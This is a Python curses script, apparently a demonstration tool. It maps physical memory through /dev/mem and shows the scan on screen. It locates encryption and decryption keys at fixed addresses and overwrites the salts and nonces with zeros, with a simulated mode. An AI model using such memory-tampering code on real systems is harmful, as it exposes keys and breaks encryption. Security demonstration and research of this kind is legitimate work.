#!/usr/bin/env python

import sys
import curses
import re
import os
import random
from time import sleep
from mmap import mmap
from subprocess import call

MIN_WIDTH = 95
UPPER_HEIGHT = 10
BYTES_PER_ROW = 16

BASE_ADDR = 0x80000000
PAGE_SIZE = 0x1000

def range_length(base, len):
  return range(base, base + len)

KEY1 = range_length(0x80000aa8, 16)
KEY2 = range_length(0x80001aa8, 16)

SALT1 = range_length(0x80000b6c, 8)
SALT2 = range_length(0x80001b6c, 8)

NONCE1 = range_length(0x80000b79, 8)
NONCE2 = range_length(0x80001b78, 8)

simulate = len(sys.argv) > 1
working = False
if simulate:
  working = sys.argv[1].lower() in ["true", "1", "yes", "t", "y"]

mem = {}
if not simulate:
  dev_mem_fd = os.open('/dev/mem', os.O_RDWR | os.O_SYNC)
  mem = mmap(dev_mem_fd, 2 * PAGE_SIZE, offset=BASE_ADDR)
  for addr in range(0, 2 * PAGE_SIZE):
    if mem[addr] != chr(0):
      working = True
else:
  for addr in range(0, 2 * PAGE_SIZE):
    if working:
      mem[addr] = chr(random.randint(0, 255))
    else:
      mem[addr] = chr(0)

def main(stdscr):
  my, mx = stdscr.getmaxyx()
  lower_height = max(7, my - UPPER_HEIGHT)
  width = max(MIN_WIDTH, mx)

  curses.curs_set(False)
  curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_GREEN)
  GREEN = curses.color_pair(1)
  curses.init_pair(2, curses.COLOR_WHITE, curses.COLOR_RED)
  RED = curses.color_pair(2)

  upper_box = curses.newwin(UPPER_HEIGHT, width, 0, 0)
  upper_box.border(0)
  upper_box.addstr(0, 1, "Status")
  upper = curses.newwin(UPPER_HEIGHT - 2, width - 2, 1, 1)
  upper.scrollok(True)

  lower_box = curses.newwin(lower_height, width, UPPER_HEIGHT, 0)
  lower_box.border(0)
  lower_box.addstr(0, 1, "Memory")
  lower = curses.newwin(lower_height - 2, width - 2, UPPER_HEIGHT + 1, 1)
  lower.scrollok(True)

  stdscr.refresh()
  upper_box.refresh()
  lower_box.refresh()
  upper.refresh()
  lower.refresh()

  upper.addstr("Ready (press any key to continue)\n")
  upper.refresh()
  stdscr.getch()
  upper.addstr("Searching...\n")
  upper.refresh()
  stdscr.nodelay(1)

  for row in range(0, 2 * PAGE_SIZE / BYTES_PER_ROW):
    row_addr = BASE_ADDR + BYTES_PER_ROW * row
    lower.addstr("0x%08x: " % row_addr)

    for col in range(0, BYTES_PER_ROW):
      addr = row_addr + col;
      lower.addstr("%02x " % ord(mem[addr - BASE_ADDR]))

    lower.refresh()
    sleep(0.015)

    middle = (lower_height - 3) / 2
    middle_addr = row_addr - (lower_height - 3 - middle) * BYTES_PER_ROW
    middle_addrs = range_length(middle_addr, BYTES_PER_ROW)

    top_addr = row_addr - (lower_height - 3) * BYTES_PER_ROW
    
    def refresh_data():
      for x_offset in range(0, BYTES_PER_ROW):
        for ry in range(0, lower_height - 2):
          rx = 12 + 3 * x_offset
          attr = curses.color_pair(lower.inch(ry, rx) >> 8)
          text = "%02x" % ord(mem[top_addr + x_offset + BYTES_PER_ROW * ry - BASE_ADDR])
          lower.addstr(ry, rx, text, attr)
      lower.refresh()
    
    def highlight_and_modify(block, text, modify):
      if not working:
        return

      if block[0] in middle_addrs:
        py, px = lower.getyx()
        upper.addstr("Found " + text + ": ")
        upper.refresh()

        lower.addstr(middle, 12 + 3 * BYTES_PER_ROW + 2, text, curses.A_BOLD)
        
        lower.addstr(0, 12, "*")
        # Highlight block
        for block_addr in block:
          offset = block_addr - middle_addr
          hy = middle
          while (offset >= BYTES_PER_ROW):
            offset -= BYTES_PER_ROW
            hy += 1
          hx = 12 + 3 * offset

          upper.addstr("%02x " % ord(mem[block_addr - BASE_ADDR]))
          upper.refresh()
          length = 3
          if (offset == BYTES_PER_ROW - 1 or block_addr == block[-1]):
            length = 2
          lower.chgat(hy, hx, length, GREEN)
          lower.refresh()
          refresh_data()
          sleep(0.1)

        upper.addstr("\n")
        upper.refresh()
        while (stdscr.getch() == -1):
          refresh_data()
          sleep(0.1)

        # Modify block
        if modify:
          upper.addstr("Modifying\n", curses.A_BOLD)
          upper.refresh()

          for block_addr in block:
            offset = block_addr - middle_addr
            hy = middle
            while (offset >= BYTES_PER_ROW):
              offset -= BYTES_PER_ROW
              hy += 1
            hx = 12 + 3 * offset
            mod_text = "00 "
            if (offset == BYTES_PER_ROW - 1 or block_addr == block[-1]):
              mod_text = "00"

            lower.addstr(hy, hx, mod_text, RED)
            lower.refresh()
            mem[block_addr - BASE_ADDR] = chr(0)
            refresh_data()
            sleep(0.1)

          lower.addstr(middle, 12 + 3 * BYTES_PER_ROW + 2, text + " (modified)", curses.A_BOLD)
          lower.refresh()
          while (stdscr.getch() == -1):
            refresh_data()
            sleep(0.1)

        lower.move(py, px)

    highlight_and_modify(KEY1, "decryption key", False)
    highlight_and_modify(KEY2, "encryption key", False)
    highlight_and_modify(SALT1, "decryption salt", True)
    highlight_and_modify(SALT2, "encryption salt", True)
    highlight_and_modify(NONCE1, "decryption nonce", True)
    highlight_and_modify(NONCE2, "encryption nonce", True)

    lower.addstr("\n")

  if not working:
    upper.addstr("Attacked fail!\n", curses.A_BOLD)
    upper.refresh()

  upper.addstr("Finished (press q to quit)")
  upper.refresh()
  while (stdscr.getch() != ord('q')):
    pass

curses.wrapper(main)
